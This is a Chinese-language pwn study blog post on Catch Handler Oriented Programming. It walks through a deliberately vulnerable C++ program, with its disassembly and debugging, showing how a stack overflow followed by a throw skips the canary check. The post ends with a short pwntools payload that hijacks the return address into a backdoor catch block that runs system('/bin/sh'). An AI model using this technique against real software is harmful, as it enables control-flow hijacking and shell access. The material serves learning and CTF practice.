---
title: "CHOP Suey: 端上异常处理的攻击盛宴"
published: 2025-09-23
updated: 2025-09-24
description: "Try-Catch, Catch Me If You Can: 异常的刀锋之 Catch Handler Oriented Programming 学习小记。"
image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.67xtux8127.avif"
tags: ["Pwn", "CHOP", "Notes"]
category: "Notes"
draft: false
---

# 前言

今天刚复现完 2024 年羊城杯的 [logger](/posts/write-ups/2024-羊城杯/#logger)，一道简单的涉及 C++ 异常处理机制的缓冲区溢出题，感觉还挺有意思，了解了一下发现有一种专门针对于异常处理而发展出来的 ROP 手法，叫做 `CHOP (Catch Handler Oriented Programming)`，也有称其为 `EOP (Exception Oriented Programming)` 的，这里我就直接沿袭原论文中的命名了。我也是参考了多方博客学习的，现在打算自己写一篇，以增强个人理解。

~_PS: 等有空了我想好好研读一下那篇论文，体验一下搞科研的感觉是什么样的（bushi_~

:::important
本文将主要研究如何通过缓冲区溢出漏洞，利用 Linux 下的 C++ 异常处理机制，跳转到任意 catch 流，执行任意函数。但这并不意味着只有 C++ 中的异常处理机制可以被利用，至少我看原作者的演讲，好像说其它语言中的异常处理机制同样存在类似的问题。

暂时不打算对异常处理及 unwind 的过程做详细分析，只做简单介绍。日后有时间我会再单独写篇博客深入 unwind 的内部实现，剖析其原理。~_所以这里就先占个坑/逃_~
:::

## 因果之链：异常展开的轨迹

### C++ 异常处理的编程思想

假设你略懂 C++ 中的 try catch 语法。不懂也没事，因为其它语言中异常的捕获与处理思想也类似。

以防有同学真的不了解异常处理的大致编程思想，我这里就简单提一嘴 C++ 中的 try catch 吧，~_虽然我其实并不会 C++/逃_~

一般对于可能发生异常的代码我们会使用 `try` 将其包裹；如果异常真的发生了，我们会通过 `throw` 将异常抛出，通知程序不要继续往下执行了，先去处理异常；而 throw 抛出的异常必定需要通过某种方式被识别吧？那就用到了 `catch`。catch 是有要求的，不是什么样的异常都可以进入同一个 catch 中。一般 throw 的时候会确定异常类型，比如是抛出了一个整形还是字符串，接着 catch 就会根据不同类型的异常而选择不同的 handler 用于处理；最终，处理完异常后程序可能会恢复执行（一般应该是从 catch 语句块之后接着执行）。

### C++ 异常处理的基本流程

当 `throw` 发生时，程序大致会做这么几件事：

- 寻找合适的 `catch`
  - 抛出异常后，从当前函数开始寻找匹配的 catch handler，找不到就将异常逐层往当前调用链的上层函数栈帧抛，直到找到能处理该类型异常的 catch handler，该过程被称为栈展开或栈回溯，即 Stack Unwindding 。如果最后回溯完整个调用链还是没找到合适的 handler，则调用 `std::terminate()`，其默认行为是使程序 abort 。
- 转移控制到 `catch handler`
  - 一旦找到匹配的 handler，控制流跳转到对应的 catch 代码块开始执行
- 恢复执行
  - 异常处理完毕后，系统会尝试恢复执行，通常是在异常被捕获的点之后继续执行

:::tip
目前我们只要知道 throw 会触发逐帧 unwind，最终跳转到合适的 catch handler 执行即可。我想上面这些简单的概念应该已经足够支撑我们理解为什么 handler 能当作 gadget 链接了，当然，前提是你已经学过了基本的 ROP 思想，我觉得这两者之间还是挺相似的，所以理解起来应该并不费劲。
:::

## 命运之刃：栈上的裂隙与挟持

:::important
下面代码使用 `g++-9` 编译测试，实测高版本在 `___cxa_allocate_exception` 之后就检测了 canary，这对我们的利用会产生影响，因此这里使用 `Ubuntu 20.04 (gcc-9 series)` 及以下版本进行测试。
:::

```cpp title="vuln.cpp"
// g++-9 -Wall vuln.cpp -o vuln -no-pie -fPIC

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

class foo {
public:
  char buf[0x10];

  foo() { printf("foo::foo() called\n"); }
  ~foo() { printf("foo::~foo() called\n"); }
};

void input();
void backdoor();

int main() {
  try {
    input();
    throw 1;
  } catch (int x) {
    printf("Int: %d\n", x);
  } catch (const char *s) {
    printf("String: %s\n", s);
  }

  printf("main() return\n");
  return 0;
}

void input() {
  foo tmp;

  printf("Enter your input: ");
  fflush(stdout);

  int size = 0x100;
  size_t len = read(0, tmp.buf, size);

  if (len > 0x10) {
    throw "Buffer overflow detected!";
  }

  printf("input() return\n");
}

void backdoor() {
  try {
    printf("We have never called this backdoor!\n");
  } catch (const char *s) {
    printf("Backdoor has catched the exception: %s\n", s);
    system("/bin/sh");
  }
}
```

先说结论，再调试。以当前示例程序为例，这里我粗略划分为三种情况：

1. 没有发生异常，程序会顺着正常路径结束 `input` 调用
2. 抛出异常，但是在当前函数被捕获，那么执行路径是：`throw -> ___cxa_begin_catch -> executing handler -> ___cxa_end_catch -> resume after catch in input() -> destructor -> check canary -> ...`
3. 抛出异常，但是当前函数中不存在对应的 cactch，那么执行路径将变为：`throw -> cleanup -> destructor -> __Unwind_Resume -> 此时进入上层栈帧查找是否含有匹配的 catch 块，没有的话继续执行 __Unwind_Resume 往上抛，直到找到为止。找到后，执行 catch handler (___cxa_begin_catch -> executing handler -> ___cxa_end_catch)，执行完后跳转到找到的那个函数的 catch 块后继续执行。若每一层都找不到，就像之前说的，会执行 std::terminate()，默认行为是 abort`

对于测试在 input 中直接 catch 的情况，可以将 input 函数修改为如下：

```cpp
void input() {
  foo tmp;

  printf("Enter your input: ");
  fflush(stdout);

  try {
    int size = 0x100;
    size_t len = read(0, tmp.buf, size);

    if (len > 0x10) {
      throw "Buffer overflow detected!";
    }
  } catch (const char *s) {
    printf("Caught in input(): %s\n", s);
  }

  printf("input() return\n");
}
```

对于上面的 2 和 3 这两种情况，我分别截取了部分汇编代码供对照分析，首先是情况 2（input 中存在匹配的 catch handler）：

```asm showLineNumbers=false
.text:00000000004013CE ;   try {
.text:00000000004013CE                 call    _read
.text:00000000004013D3                 mov     [rbp+var_40], rax
.text:00000000004013D7                 cmp     [rbp+var_40], 10h
.text:00000000004013DC                 jbe     short loc_401409
.text:00000000004013DE                 mov     edi, 8          ; thrown_size
.text:00000000004013E3                 call    ___cxa_allocate_exception
.text:00000000004013E8                 lea     rdx, aBufferOverflow ; "Buffer overflow detected!"
.text:00000000004013EF                 mov     [rax], rdx
.text:00000000004013F2                 mov     edx, 0          ; void (*)(void *)
.text:00000000004013F7                 mov     rcx, cs:_ZTIPKc_ptr
.text:00000000004013FE                 mov     rsi, rcx        ; lptinfo
.text:0000000000401401                 mov     rdi, rax        ; exception
.text:0000000000401404                 call    ___cxa_throw
.text:0000000000401404 ;   } // starts at 4013CE
.text:0000000000401409 ; ---------------------------------------------------------------------------
.text:0000000000401409
.text:0000000000401409 loc_401409:                             ; CODE XREF: input(void)+72↑j
.text:0000000000401409                                         ; input(void)+101↓j
.text:0000000000401409                 lea     rdi, aInputReturn ; "input() return"
.text:0000000000401410 ;   try {
.text:0000000000401410                 call    _puts
.text:0000000000401410 ;   } // starts at 401410
.text:0000000000401415                 lea     rax, [rbp+buf]
.text:0000000000401419                 mov     rdi, rax        ; this
.text:000000000040141C                 call    _ZN3fooD1Ev     ; foo::~foo()
.text:0000000000401421                 nop
.text:0000000000401422                 mov     rax, [rbp+var_18]
.text:0000000000401426                 xor     rax, fs:28h
.text:000000000040142F                 jz      short loc_40149E
.text:0000000000401431                 jmp     short loc_401499
.text:0000000000401433 ; ---------------------------------------------------------------------------
.text:0000000000401433 ;   catch(char const*) // owned by 4013CE
.text:0000000000401433                 endbr64
.text:0000000000401437                 cmp     rdx, 1
.text:000000000040143B                 jz      short loc_401442
.text:000000000040143D                 mov     rbx, rax
.text:0000000000401440                 jmp     short loc_401482
.text:0000000000401442 ; ---------------------------------------------------------------------------
.text:0000000000401442
.text:0000000000401442 loc_401442:                             ; CODE XREF: input(void)+D1↑j
.text:0000000000401442                 mov     rdi, rax        ; void *
.text:0000000000401445                 call    ___cxa_begin_catch
.text:000000000040144A                 mov     [rbp+var_38], rax
.text:000000000040144E                 mov     rax, [rbp+var_38]
.text:0000000000401452                 mov     rsi, rax
.text:0000000000401455                 lea     rdi, aCaughtInInputS ; "Caught in input(): %s\n"
.text:000000000040145C                 mov     eax, 0
.text:0000000000401461 ;   try {
.text:0000000000401461                 call    _printf
.text:0000000000401461 ;   } // starts at 401461
.text:0000000000401466                 call    ___cxa_end_catch
.text:000000000040146B                 jmp     short loc_401409
.text:000000000040146D ; ---------------------------------------------------------------------------
.text:000000000040146D ;   cleanup() // owned by 401461
.text:000000000040146D                 endbr64
.text:0000000000401471                 mov     rbx, rax
.text:0000000000401474                 call    ___cxa_end_catch
.text:0000000000401479                 jmp     short loc_401482
.text:000000000040147B ; ---------------------------------------------------------------------------
.text:000000000040147B ;   cleanup() // owned by 40139E
.text:000000000040147B ;   cleanup() // owned by 401410
.text:000000000040147B                 endbr64
.text:000000000040147F                 mov     rbx, rax
.text:0000000000401482
.text:0000000000401482 loc_401482:                             ; CODE XREF: input(void)+D6↑j
.text:0000000000401482                                         ; input(void)+10F↑j
.text:0000000000401482                 lea     rax, [rbp+buf]
.text:0000000000401486                 mov     rdi, rax        ; this
.text:0000000000401489                 call    _ZN3fooD1Ev     ; foo::~foo()
.text:000000000040148E                 mov     rax, rbx
.text:0000000000401491                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:0000000000401494                 call    __Unwind_Resume
.text:0000000000401499 ; ---------------------------------------------------------------------------
.text:0000000000401499
.text:0000000000401499 loc_401499:                             ; CODE XREF: input(void)+C7↑j
.text:0000000000401499                 call    ___stack_chk_fail
.text:000000000040149E ; ---------------------------------------------------------------------------
.text:000000000040149E
.text:000000000040149E loc_40149E:                             ; CODE XREF: input(void)+C5↑j
.text:000000000040149E                 add     rsp, 48h
.text:00000000004014A2                 pop     rbx
.text:00000000004014A3                 pop     rbp
.text:00000000004014A4                 retn
.text:00000000004014A4 ; } // starts at 40136A
.text:00000000004014A4 _Z5inputv       endp
```

然后是情况 3（input 中不存在匹配的 catch handler）：

```asm showLineNumbers=false
.text:000000000040139E ;   try {
.text:000000000040139E                 call    _printf
.text:00000000004013A3                 mov     rax, cs:stdout_ptr
.text:00000000004013AA                 mov     rax, [rax]
.text:00000000004013AD                 mov     rdi, rax        ; stream
.text:00000000004013B0                 call    _fflush
.text:00000000004013B5                 mov     [rbp+var_3C], 100h
.text:00000000004013BC                 mov     eax, [rbp+var_3C]
.text:00000000004013BF                 movsxd  rdx, eax        ; nbytes
.text:00000000004013C2                 lea     rax, [rbp+buf]
.text:00000000004013C6                 mov     rsi, rax        ; buf
.text:00000000004013C9                 mov     edi, 0          ; fd
.text:00000000004013CE                 call    _read
.text:00000000004013D3                 mov     [rbp+var_38], rax
.text:00000000004013D7                 cmp     [rbp+var_38], 10h
.text:00000000004013DC                 jbe     short loc_401409
.text:00000000004013DE                 mov     edi, 8          ; thrown_size
.text:00000000004013E3                 call    ___cxa_allocate_exception
.text:00000000004013E8                 lea     rdx, aBufferOverflow ; "Buffer overflow detected!"
.text:00000000004013EF                 mov     [rax], rdx
.text:00000000004013F2                 mov     edx, 0          ; void (*)(void *)
.text:00000000004013F7                 mov     rcx, cs:_ZTIPKc_ptr
.text:00000000004013FE                 mov     rsi, rcx        ; lptinfo
.text:0000000000401401                 mov     rdi, rax        ; exception
.text:0000000000401404                 call    ___cxa_throw
.text:0000000000401409 ; ---------------------------------------------------------------------------
.text:0000000000401409
.text:0000000000401409 loc_401409:                             ; CODE XREF: input(void)+72↑j
.text:0000000000401409                 lea     rdi, aInputReturn ; "input() return"
.text:0000000000401410                 call    _puts
.text:0000000000401410 ;   } // starts at 40139E
.text:0000000000401415                 lea     rax, [rbp+buf]
.text:0000000000401419                 mov     rdi, rax        ; this
.text:000000000040141C                 call    _ZN3fooD1Ev     ; foo::~foo()
.text:0000000000401421                 nop
.text:0000000000401422                 mov     rax, [rbp+var_18]
.text:0000000000401426                 xor     rax, fs:28h
.text:000000000040142F                 jz      short loc_401456
.text:0000000000401431                 jmp     short loc_401451
.text:0000000000401433 ; ---------------------------------------------------------------------------
.text:0000000000401433 ;   cleanup() // owned by 40139E
.text:0000000000401433                 endbr64
.text:0000000000401437                 mov     rbx, rax
.text:000000000040143A                 lea     rax, [rbp+buf]
.text:000000000040143E                 mov     rdi, rax        ; this
.text:0000000000401441                 call    _ZN3fooD1Ev     ; foo::~foo()
.text:0000000000401446                 mov     rax, rbx
.text:0000000000401449                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:000000000040144C                 call    __Unwind_Resume
.text:0000000000401451 ; ---------------------------------------------------------------------------
.text:0000000000401451
.text:0000000000401451 loc_401451:                             ; CODE XREF: input(void)+C7↑j
.text:0000000000401451                 call    ___stack_chk_fail
.text:0000000000401456 ; ---------------------------------------------------------------------------
.text:0000000000401456
.text:0000000000401456 loc_401456:                             ; CODE XREF: input(void)+C5↑j
.text:0000000000401456                 add     rsp, 38h
.text:000000000040145A                 pop     rbx
.text:000000000040145B                 pop     rbp
.text:000000000040145C                 retn
.text:000000000040145C ; } // starts at 40136A
.text:000000000040145C _Z5inputv       endp
```

此时会将异常上抛到调用它的函数，也就是 `main`，去 main 中查找有无匹配的 catch 块：

```asm showLineNumbers=false
.text:0000000000401276 ; =============== S U B R O U T I N E =======================================
.text:0000000000401276
.text:0000000000401276 ; Attributes: bp-based frame
.text:0000000000401276
.text:0000000000401276 ; int __fastcall main(int argc, const char **argv, const char **envp)
.text:0000000000401276                 public main
.text:0000000000401276 main            proc near               ; DATA XREF: _start+18↑o
.text:0000000000401276
.text:0000000000401276 var_1C          = dword ptr -1Ch
.text:0000000000401276 var_18          = qword ptr -18h
.text:0000000000401276
.text:0000000000401276 ; __unwind { // __gxx_personality_v0
.text:0000000000401276                 endbr64
.text:000000000040127A                 push    rbp
.text:000000000040127B                 mov     rbp, rsp
.text:000000000040127E                 push    rbx
.text:000000000040127F                 sub     rsp, 18h
.text:0000000000401283 ;   try {
.text:0000000000401283                 call    _Z5inputv       ; input(void)
.text:0000000000401288                 mov     edi, 4          ; thrown_size
.text:000000000040128D                 call    ___cxa_allocate_exception
.text:0000000000401292                 mov     dword ptr [rax], 1
.text:0000000000401298                 mov     edx, 0          ; void (*)(void *)
.text:000000000040129D                 mov     rcx, cs:lptinfo
.text:00000000004012A4                 mov     rsi, rcx        ; lptinfo
.text:00000000004012A7                 mov     rdi, rax        ; exception
.text:00000000004012AA                 call    ___cxa_throw
.text:00000000004012AA ;   } // starts at 401283
.text:00000000004012AF ; ---------------------------------------------------------------------------
.text:00000000004012AF
.text:00000000004012AF loc_4012AF:                             ; CODE XREF: main+8F↓j
.text:00000000004012AF                                         ; main+BA↓j
.text:00000000004012AF                 lea     rdi, s          ; "main() return"
.text:00000000004012B6                 call    _puts
.text:00000000004012BB                 mov     eax, 0
.text:00000000004012C0                 jmp     loc_401363
.text:00000000004012C5 ; ---------------------------------------------------------------------------
.text:00000000004012C5 ;   catch(int) // owned by 401283
.text:00000000004012C5 ;   catch(char const*) // owned by 401283
.text:00000000004012C5                 endbr64
.text:00000000004012C9                 cmp     rdx, 1
.text:00000000004012CD                 jz      short loc_4012DD
.text:00000000004012CF                 cmp     rdx, 2
.text:00000000004012D3                 jz      short loc_401307
.text:00000000004012D5                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:00000000004012D8                 call    __Unwind_Resume
.text:00000000004012DD ; ---------------------------------------------------------------------------
.text:00000000004012DD
.text:00000000004012DD loc_4012DD:                             ; CODE XREF: main+57↑j
.text:00000000004012DD                 mov     rdi, rax        ; void *
.text:00000000004012E0                 call    ___cxa_begin_catch
.text:00000000004012E5                 mov     eax, [rax]
.text:00000000004012E7                 mov     [rbp+var_1C], eax
.text:00000000004012EA                 mov     eax, [rbp+var_1C]
.text:00000000004012ED                 mov     esi, eax
.text:00000000004012EF                 lea     rdi, format     ; "Int: %d\n"
.text:00000000004012F6                 mov     eax, 0
.text:00000000004012FB ;   try {
.text:00000000004012FB                 call    _printf
.text:00000000004012FB ;   } // starts at 4012FB
.text:0000000000401300                 call    ___cxa_end_catch
.text:0000000000401305                 jmp     short loc_4012AF
.text:0000000000401307 ; ---------------------------------------------------------------------------
.text:0000000000401307
.text:0000000000401307 loc_401307:                             ; CODE XREF: main+5D↑j
.text:0000000000401307                 mov     rdi, rax        ; void *
.text:000000000040130A                 call    ___cxa_begin_catch
.text:000000000040130F                 mov     [rbp+var_18], rax
.text:0000000000401313                 mov     rax, [rbp+var_18]
.text:0000000000401317                 mov     rsi, rax
.text:000000000040131A                 lea     rdi, aStringS   ; "String: %s\n"
.text:0000000000401321                 mov     eax, 0
.text:0000000000401326 ;   try {
.text:0000000000401326                 call    _printf
.text:0000000000401326 ;   } // starts at 401326
.text:000000000040132B                 call    ___cxa_end_catch
.text:0000000000401330                 jmp     loc_4012AF
.text:0000000000401335 ; ---------------------------------------------------------------------------
.text:0000000000401335 ;   cleanup() // owned by 4012FB
.text:0000000000401335                 endbr64
.text:0000000000401339                 mov     rbx, rax
.text:000000000040133C                 call    ___cxa_end_catch
.text:0000000000401341                 mov     rax, rbx
.text:0000000000401344                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:0000000000401347                 call    __Unwind_Resume
.text:000000000040134C ; ---------------------------------------------------------------------------
.text:000000000040134C ;   cleanup() // owned by 401326
.text:000000000040134C                 endbr64
.text:0000000000401350                 mov     rbx, rax
.text:0000000000401353                 call    ___cxa_end_catch
.text:0000000000401358                 mov     rax, rbx
.text:000000000040135B                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:000000000040135E                 call    __Unwind_Resume
.text:0000000000401363 ; ---------------------------------------------------------------------------
.text:0000000000401363
.text:0000000000401363 loc_401363:                             ; CODE XREF: main+4A↑j
.text:0000000000401363                 add     rsp, 18h
.text:0000000000401367                 pop     rbx
.text:0000000000401368                 pop     rbp
.text:0000000000401369                 retn
.text:0000000000401369 ; } // starts at 401276
.text:0000000000401369 main            endp
```

所以我们发现，如果程序中途抛出了异常，那么接下来的代码一般是不会执行的，而是直接去一层层 unwind，寻找匹配的 catch handler 。

想必敏锐的你已经意识到了什么……

:::important
一般来说 canary 都是在函数即将返回的时候检测的，位于函数代码的最下面。那么，如果我们中间 throw 了异常，就不会往下执行剩余的代码，这其中就包含了 canary 的检测。即，我们无视 canary 返回到了某个 catch handler 分支。
:::

这就引出了一个问题：我们是否有办法控制它返回到任意 handler ？

不知道，调一下就清楚了。咱也不清楚 handler 是根据什么返回的，索性分别尝试覆盖 `rbp` 和返回地址的值看看。

首先是只覆盖了 `rbp`，我们发现执行 `_Unwind_Resume` 前 `rbp` 是 `0x7ffe29f72c50 ◂— 0x4242424242424242 ('BBBBBBBB')`：

<center>
  <img src="https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.2ksaalfwn4.avif" alt="" />
</center>

执行完 `_Unwind_Resume` 后 `rbp` 就变成了我们写入的 `B`，然后继续往下执行，最终卡在了这个地方：

<center>
  <img src="https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.pfphz109v.avif" alt="" />
</center>

原因是不能解引用 `rbp - 0x18` 这个地址，因为它是非法地址。

不过根据我们的观察，发现这里只是用 rbp 为基地址的内存去临时存放一些东西，此处是 `Buffer overflow detected!` 字符串，用于 printf：

```asm showLineNumbers=false {2-3}
pwndbg> x/10i $rip
=> 0x40130f <main+153>: mov    QWORD PTR [rbp-0x18],rax
   0x401313 <main+157>: mov    rax,QWORD PTR [rbp-0x18]
   0x401317 <main+161>: mov    rsi,rax
   0x40131a <main+164>: lea    rdi,[rip+0xd23]        # 0x402044
   0x401321 <main+171>: mov    eax,0x0
   0x401326 <main+176>: call   0x4010e0 <printf@plt>
   0x40132b <main+181>: call   0x401160 <__cxa_end_catch@plt>
   0x401330 <main+186>: jmp    0x4012af <main+57>
   0x401335 <main+191>: endbr64
   0x401339 <main+195>: mov    rbx,rax
pwndbg> x/s 0x402044
0x402044: "String: %s\n"
pwndbg> x/s $rax
0x402063: "Buffer overflow detected!"
```

既然 rbp 只要是能 rw 的地址，程序又没开 PIE，那我们直接将其修改为 bss 的地址，就可以继续往下执行了：

<center>
  <img src="https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.6f11tkdlft.avif" alt="" />
</center>

现在我们尝试覆盖返回地址，看看会发生什么：

<center>
  <img src="https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.szbfpmqwq.avif" alt="" />
</center>

又是因为访问非法地址而 abort，这次是 `rax`，而 `rax` 存的是我们覆盖的返回地址。嗯……如果继续用 bss 地址代替会发生什么呢？

<center>
  <img src="https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.45i1a3etar.avif" alt="" />
  <img src="https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.6m49p0rvc0.avif" alt="" />
</center>

发现程序进入了 `std::terminate()`，然后输出了 `terminate called after throwing an instance of 'char const*'` 就 abort 了。

回想我们一开始就说的流程，「如果最后回溯完整个调用链还是没找到合适的 handler，则调用 std::terminate()，其默认行为是使程序 abort 。」所以这条输出代表它已经搜遍了所有函数的 catch 块（发生于 `_Unwind_RaiseException` 中），但任未找到合适的 catch handler 。那我们可以合理猜测，程序是不是根据这个返回地址值确定上哪找 catch 块呢？因为如果我们不修改这个返回地址的值的话，它的值默认是 main 中 throw 的地址，而不修改它的话程序会正常进入 main 中与之匹配的 catch handler，输出我们预期的信息：

```plaintext showLineNumbers=false
[DEBUG] Received 0x67 bytes:
    b'foo::foo() called\n'
    b'Enter your input: foo::~foo() called\n'
    b'String: Buffer overflow detected!\n'
    b'main() return\n'
```

猜想有了，现在就付诸实践吧～

通过查看交叉引用，我们定位到包含 `system("/bin/sh")` 后门的 catch 块：

```asm {18-23} del={31-44} showLineNumbers=false
.text:000000000040145D ; =============== S U B R O U T I N E =======================================
.text:000000000040145D
.text:000000000040145D ; Attributes: bp-based frame
.text:000000000040145D
.text:000000000040145D ; int __fastcall backdoor()
.text:000000000040145D                 public _Z8backdoorv
.text:000000000040145D _Z8backdoorv    proc near
.text:000000000040145D
.text:000000000040145D var_18          = qword ptr -18h
.text:000000000040145D
.text:000000000040145D ; __unwind { // __gxx_personality_v0
.text:000000000040145D                 endbr64
.text:0000000000401461                 push    rbp
.text:0000000000401462                 mov     rbp, rsp
.text:0000000000401465                 push    rbx
.text:0000000000401466                 sub     rsp, 18h
.text:000000000040146A                 lea     rdi, aWeHaveNeverCal ; "We have never called this backdoor!"
.text:0000000000401471 ;   try {
.text:0000000000401471                 call    _puts
.text:0000000000401471 ;   } // starts at 401471
.text:0000000000401476                 jmp     short loc_4014D8
.text:0000000000401478 ; ---------------------------------------------------------------------------
.text:0000000000401478 ;   catch(char const*) // owned by 401471
.text:0000000000401478                 endbr64
.text:000000000040147C                 cmp     rdx, 1
.text:0000000000401480                 jz      short loc_40148A
.text:0000000000401482                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:0000000000401485                 call    __Unwind_Resume
.text:000000000040148A ; ---------------------------------------------------------------------------
.text:000000000040148A
.text:000000000040148A loc_40148A:                             ; CODE XREF: backdoor(void)+23↑j
.text:000000000040148A                 mov     rdi, rax        ; void *
.text:000000000040148D                 call    ___cxa_begin_catch
.text:0000000000401492                 mov     [rbp+var_18], rax
.text:0000000000401496                 mov     rax, [rbp+var_18]
.text:000000000040149A                 mov     rsi, rax
.text:000000000040149D                 lea     rdi, aBackdoorHasCat ; "Backdoor has catched the exception: %s"...
.text:00000000004014A4                 mov     eax, 0
.text:00000000004014A9 ;   try {
.text:00000000004014A9                 call    _printf
.text:00000000004014AE                 lea     rdi, command    ; "/bin/sh"
.text:00000000004014B5                 call    _system
.text:00000000004014B5 ;   } // starts at 4014A9
.text:00000000004014BA                 call    ___cxa_end_catch
.text:00000000004014BF                 jmp     short loc_4014D8
.text:00000000004014C1 ; ---------------------------------------------------------------------------
.text:00000000004014C1 ;   cleanup() // owned by 4014A9
.text:00000000004014C1                 endbr64
.text:00000000004014C5                 mov     rbx, rax
.text:00000000004014C8                 call    ___cxa_end_catch
.text:00000000004014CD                 mov     rax, rbx
.text:00000000004014D0                 mov     rdi, rax        ; struct _Unwind_Exception *
.text:00000000004014D3                 call    __Unwind_Resume
.text:00000000004014D8 ; ---------------------------------------------------------------------------
.text:00000000004014D8
.text:00000000004014D8 loc_4014D8:                             ; CODE XREF: backdoor(void)+19↑j
.text:00000000004014D8                                         ; backdoor(void)+62↑j
.text:00000000004014D8                 add     rsp, 18h
.text:00000000004014DC                 pop     rbx
.text:00000000004014DD                 pop     rbp
.text:00000000004014DE                 retn
.text:00000000004014DE ; } // starts at 40145D
.text:00000000004014DE _Z8backdoorv    endp
```

它的 catch 是 `catch(char const*)`，和我们 throw 出来的类型一样，即我们可以尝试返回到这个 catch handler 。

经过测试，我们将返回地址覆盖为后门 catch 的 try 地址加一，即 `0x401471 + 0x1` 就可以 get shell 。至于这个地址到底应该覆盖为什么，经测试发现它属于一个从 try 地址开始的左开又不确定区间。

最终 payload 如下：

```python
payload = flat(
    b"A" * 0x30,
    elf.bss(),
    0x401471 + 0x1,
)
target.send(payload)
```

所以我们不仅无视了 canary，还成功跳转到了任意 catch handler 。不过经测试，用高版本 g++ 编译出来的程序会将 canary 检测加到 `___cxa_allocate_exception` 之后，也就阻止了这种利用方式。不过这个方法在 Ubuntu 20.04 LTS 上还是可以使用的，低版本应该也没问题，所以还是值得学习的。

整明白了这个覆盖返回地址劫持 catch handler 的方法后，就可以做点实际的题目试试了，比如 2024 羊城杯的 [logger](/posts/write-ups/2024-羊城杯/#logger) 。

劫持返回地址只是 CHOP 冷兵器时代的攻击手法之一，还有其它方法，以及我们还可以控制 `std::terminate()` 执行任意函数，那才是 CHOP 真正的魅力之所在。~_but 等我有空再继续写吧/逃_~

## 秩序之火：任意调用与自由的幻象

TODO

# References

- [溢出漏洞在异常处理中的攻击利用手法-上](https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdmng)
- [溢出漏洞在异常处理中的攻击手法-下](https://rivers.chaitin.cn/blog/cq70jnqp1rhtmlvvdpng)
- [分享 C++ PWN 出题经历——深入研究异常处理机制](https://zhuanlan.zhihu.com/p/13157062538)
- [Let Me Unwind That For You: Exceptions to Backward-Edge Protection](https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_s295_paper.pdf)
- [NDSS 2023 - Let Me Unwind That For You: Exceptions to Backward-Edge Protection](https://www.youtube.com/watch?v=S6dh83ZNTqY)
